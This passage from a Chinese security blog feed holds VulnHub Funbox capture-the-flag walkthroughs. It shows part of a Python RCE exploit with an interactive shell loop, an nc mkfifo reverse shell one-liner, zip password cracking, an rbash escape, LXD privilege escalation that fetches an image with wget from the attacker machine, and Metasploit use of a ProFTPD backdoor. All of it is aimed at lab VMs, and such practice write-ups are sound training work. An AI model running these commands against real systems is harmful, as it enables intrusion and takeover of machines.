class="line"><span class="comment">#testing vulnerability accessing the directory</span></span><br><span class="line">test = requests.get(testVulnUrl)</span><br><span class="line"></span><br><span class="line"><span class="comment">#checking the install directory still exist or able to access or not</span></span><br><span class="line"><span class="keyword">if</span>(test.status_code == <span class="number">200</span>):</span><br><span class="line">	print(<span class="string">'[*] Install directory still available, the host likely vulnerable to the exploit.'</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#testing system command injection</span></span><br><span class="line">	print(<span class="string">'[*] Testing injecting system command to test vulnerability'</span>)</span><br><span class="line">	cmd = <span class="string">'whoami'</span></span><br><span class="line"></span><br><span class="line">	print(<span class="string">'User: '</span>, end=<span class="string">''</span>)</span><br><span class="line">	err = rce(cmd)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(err != <span class="literal">None</span>):</span><br><span class="line">		print(err)</span><br><span class="line">		sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">		cmd = input(<span class="string">'RCE_SHELL$ '</span>)</span><br><span class="line">		err = rce(cmd)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(err != <span class="literal">None</span>):</span><br><span class="line">			print(err)</span><br><span class="line">			sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	print(<span class="string">'[!] Install directory not found, the host is not vulnerable'</span>)</span><br><span class="line">	sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到<code>shell</code></li>
</ul>
<p><img data-src="./Funbox10/5.png" alt></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹<code>shell</code></h3><ul>
<li><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 192.168.1.224 7777 &gt;/tmp/f</code></li>
</ul>
<p><img data-src="./Funbox10/6.png" alt></p>
<ul>
<li><code>kali</code>接收到<code>shell</code></li>
</ul>
<p><img data-src="./Funbox10/7.png" alt></p>
<ul>
<li>发现敏感信息</li>
</ul>
<p><img data-src="./Funbox10/8.png" alt></p>
<ul>
<li>切花到<code>jack</code>用户</li>
</ul>
<p><img data-src="./Funbox10/9.png" alt></p>
<h3 id="提权-amp-amp-flag"><a href="#提权-amp-amp-flag" class="headerlink" title="提权&amp;&amp;flag"></a>提权&amp;&amp;<code>flag</code></h3><ul>
<li>发现敏感文件</li>
</ul>
<p><img data-src="./Funbox10/10.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">LXUgcm9vdCAtcCByZnZiZ3QhIQ==</span><br><span class="line"></span><br><span class="line">base64</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">-u root -p rfvbgt!!</span><br></pre></td></tr></table></figure>

<p><img data-src="./Funbox10/11.png" alt></p>
<p><img data-src="./Funbox10/12.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Funbox</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Funbox11</title>
    <url>/2021/08/08/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Funbox11/</url>
    <content><![CDATA[<h1 id="Funbox11"><a href="#Funbox11" class="headerlink" title="Funbox11"></a>Funbox11</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Funbox11</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:5b, IPv4: 192.168.1.224</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1	d8:c8:e9:fe:be:88	Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2	20:41:10:1a:04:8c	(Unknown)</span><br><span class="line">192.168.1.3	00:11:32:73:68:3b	Synology Incorporated</span><br><span class="line">192.168.1.4	00:0c:29:5a:87:06	VMware, Inc.</span><br><span class="line">192.168.1.5	00:0c:29:76:5e:9f	VMware, Inc.</span><br><span class="line">192.168.1.109	40:31:3c:22:9c:f3	XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.111	38:d2:ca:db:01:69	Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.1.171	08:00:27:a9:83:d8	PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.1.189	b0:25:aa:2d:f5:9b	Private</span><br><span class="line"></span><br><span class="line">10 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.958 seconds (130.75 hosts/sec). 10 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.171</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.1.171</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.1.171</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 11:56 EDT</span><br><span class="line">Nmap scan report for funbox11.lan (192.168.1.171)</span><br><span class="line">Host is up (0.00036s latency).</span><br><span class="line">Not shown: 65527 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         ProFTPD 1.3.3c</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a6:0e:30:35:3b:ef:43:44:f5:1c:d7:c6:58:64:09:92 (RSA)</span><br><span class="line">|   256 c2:d8:bd:62:bf:13:89:28:f8:61:e0:a6:c4:f7:a5:bf (ECDSA)</span><br><span class="line">|_  256 12:60:6e:58:ee:f2:bd:9c:ff:b0:35:05:83:08:71:b8 (ED25519)</span><br><span class="line">25/tcp  open  smtp        Postfix smtpd</span><br><span class="line">|_smtp-commands: funbox11, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, </span><br><span class="line">| ssl-cert: Subject: commonName=funbox11</span><br><span class="line">| Not valid before: 2021-07-19T16:52:14</span><br><span class="line">|_Not valid after:  2031-07-17T16:52:14</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-generator: WordPress 5.8</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Funbox: Scriptkiddie</span><br><span class="line">110/tcp open  pop3        Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: SASL CAPA UIDL AUTH-RESP-CODE RESP-CODES PIPELINING TOP</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp open  imap        Dovecot imapd</span><br><span class="line">|_imap-capabilities: SASL-IR ENABLE LITERAL+ ID more post-login LOGIN-REFERRALS LOGINDISABLEDA0001 OK have listed Pre-login capabilities IDLE IMAP4rev1</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 08:00:27:A9:83:D8 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: Hosts:  funbox11, FUNBOX11; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -40m05s, deviation: 1h09m16s, median: -5s</span><br><span class="line">|_nbstat: NetBIOS name: FUNBOX11, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: funbox11</span><br><span class="line">|   NetBIOS computer name: FUNBOX11\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: funbox11</span><br><span class="line">|_  System time: 2021-08-08T17:56:21+02:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-08-08T15:56:21</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 15.31 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Funbox11/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.171/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.171/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.171/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/08/08 11:56:30 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/wp-content           (Status: 301) [Size: 319] [--&gt; http://192.168.1.171/wp-content/]</span><br><span class="line">/index.php            (Status: 301) [Size: 0] [--&gt; http://192.168.1.171/]             </span><br><span class="line">/license.txt          (Status: 200) [Size: 19915]                                     </span><br><span class="line">/wp-includes          (Status: 301) [Size: 320] [--&gt; http://192.168.1.171/wp-includes/]</span><br><span class="line">/wp-login.php         (Status: 200) [Size: 6180]                                       </span><br><span class="line">/readme.html          (Status: 200) [Size: 7346]                                       </span><br><span class="line">/wp-trackback.php     (Status: 200) [Size: 135]                                        </span><br><span class="line">/wp-admin             (Status: 301) [Size: 317] [--&gt; http://192.168.1.171/wp-admin/]   </span><br><span class="line">/xmlrpc.php           (Status: 405) [Size: 42]                                         </span><br><span class="line">/wp-signup.php        (Status: 302) [Size: 0] [--&gt; http://funbox11/wp-login.php?action=register]</span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                                 </span><br><span class="line">                                                                                                </span><br><span class="line">===============================================================</span><br><span class="line">2021/08/08 12:00:06 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li><p>配置<code>host</code>  <code>192.168.1.171 funbox11</code></p>
</li>
<li><p>首页</p>
</li>
</ul>
<p><img data-src="./Funbox11/2.png" alt></p>
<h3 id="ftp后门"><a href="#ftp后门" class="headerlink" title="ftp后门"></a>ftp后门</h3><ul>
<li>发现<code>ProFTPD 1.3.3c</code>后门</li>
</ul>
<p><img data-src="./Funbox11/3.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><ul>
<li><code>msf</code>一把梭哈</li>
</ul>
<p><img data-src="./Funbox11/4.png" alt></p>
<p><img data-src="./Funbox11/5.png" alt></p>
<p><img data-src="./Funbox11/6.png" alt></p>
<ul>
<li>怎么看都不像是预期解</li>
</ul>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Funbox</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Funbox2</title>
    <url>/2021/07/17/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Funbox2/</url>
    <content><![CDATA[<h1 id="Funbox2"><a href="#Funbox2" class="headerlink" title="Funbox2"></a>Funbox2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Funbox2</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:5b, IPv4: 192.168.1.224</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1	d8:c8:e9:fe:be:88	Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.150	08:00:27:29:dc:e4	PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.1.189	b0:25:aa:2d:f5:9b	Private</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.962 seconds (130.48 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.150</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.1.150</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.1.150</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 23:09 EDT</span><br><span class="line">Nmap scan report for funbox2.lan (192.168.1.150)</span><br><span class="line">Host is up (0.00051s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     ProFTPD 1.3.5e</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip</span><br><span class="line">| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip</span><br><span class="line">| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip</span><br><span class="line">| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg</span><br><span class="line">|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA)</span><br><span class="line">|   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA)</span><br><span class="line">|_  256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/logs/</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 08:00:27:29:DC:E4 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.21 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Funbox2/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.150/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.150/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.150/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/07/16 23:10:06 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 10918]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 17]   </span><br><span class="line">/server-status        (Status: 403) [Size: 278]  </span><br><span class="line">                                                 </span><br><span class="line">===============================================================</span><br><span class="line">2021/07/16 23:12:23 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Funbox2/2.png" alt></p>
<ul>
<li><code>FTP</code></li>
</ul>
<p><img data-src="./Funbox2/3.png" alt></p>
<p>备注:通通带密码</p>
<h3 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h3><ul>
<li>破解到的密码如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fcrackzip  -D -p /usr/share/wordlists/rockyou.txt -u ./cathrine.zip</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox2/ftp]</span><br><span class="line">└─# fcrackzip  -D -p /usr/share/wordlists/rockyou.txt -u ./cathrine.zip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == catwoman</span><br><span class="line"></span><br><span class="line">fcrackzip  -D -p /usr/share/wordlists/rockyou.txt -u ./tom.zip</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox2/ftp]</span><br><span class="line">└─# fcrackzip  -D -p /usr/share/wordlists/rockyou.txt -u ./tom.zip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == iubire</span><br></pre></td></tr></table></figure>

<ul>
<li>解压拿到<code>id_ras</code>密钥</li>
</ul>
<h3 id="tom-shell"><a href="#tom-shell" class="headerlink" title="tom shell"></a>tom shell</h3><ul>
<li>通过<code>ssh</code>私钥拿到<code>tom-shell</code></li>
</ul>
<p><img data-src="./Funbox2/4.png" alt></p>
<ul>
<li><code>rbash</code>绕过</li>
</ul>
<p><img data-src="./Funbox2/5.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;saghul&#x2F;lxd-alpine-builder.git</span><br><span class="line">cd lxd-alpine-builder</span><br><span class="line">.&#x2F;build-alpine</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line"></span><br><span class="line">cd &#x2F;tmp</span><br><span class="line">wget http:&#x2F;&#x2F;192.168.1.224&#x2F;alpine-v3.14-x86_64-20210715_1021.tar.gz</span><br><span class="line"></span><br><span class="line">lxd init</span><br><span class="line">lxc image import .&#x2F;alpine-v3.14-x86_64-20210715_1021.tar.gz --alias myimage</span><br><span class="line"></span><br><span class="line">lxc image list</span><br><span class="line"></span><br><span class="line">lxc init myimage ignite -c security.privileged&#x3D;true</span><br><span class="line">lxc config device add ignite mydevice disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true</span><br><span class="line">lxc start ignite</span><br><span class="line">lxc exec ignite &#x2F;bin&#x2F;sh</span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">cd &#x2F;mnt&#x2F;root&#x2F;root</span><br><span class="line">ls</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>

<p><img data-src="./Funbox2/6.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Funbox</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Funbox3</title>
    <url>/2021/07/17/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Funbox3/</url>
    <content><![CDATA[<h1 id="Funbox3"><a href="#Funbox3" class="headerlink" title="Funbox3"></a>Funbox3</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Funbox3</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox3]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:5b, IPv4: 192.168.1.224</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1	d8:c8:e9:fe:be:88	Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.177	08:00:27:4d:d2:73	PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.1.189	b0:25:aa:2d:f5:9b	Private</span><br><span class="line">192.168.1.190	32:f9:e9:ee:d8:ba	(Unknown: locally administered)</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.010 seconds (127.36 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.177</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.1.177</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/funbox3]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.1.177</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-17 04:38 EDT</span><br><span class="line">Nmap scan report for funbox3.lan (192.168.1.177)</span><br><span class="line">Host is up (0.00054s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 b2:d8:51:6e:c5:84:05:19:08:eb:c8:58:27:13:13:2f (RSA)</span><br><span class="line">|   256 b0:de:97:03:a7:2f:f4:e2:ab:4a:9c:d9:43:9b:8a:48 (ECDSA)</span><br><span class="line">|_  256 9d:0f:9a:26:38:4f:01:80:a7:a6:80:9d:d1:d4:cf:ec (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_gym</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">33060/tcp open  mysqlx?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: </span><br><span class="line">|     Invalid message"</span><br><span class="line">|_    HY000</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port33060-TCP:V=7.91%I=7%D=7/17%Time=60F296FE%P=x86_64-pc-linux-gnu%r(N</span><br><span class="line">SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\</span><br><span class="line">SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp</span><br><span class="line">SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b</span><br><span class="line">SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers</span><br><span class="line">SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2</span><br><span class="line">SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI</span><br><span class="line">SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")</span><br><span class="line">SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01</span><br><span class="line">SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie</span><br><span class="line">SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x</span><br><span class="line">SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"</span><br><span 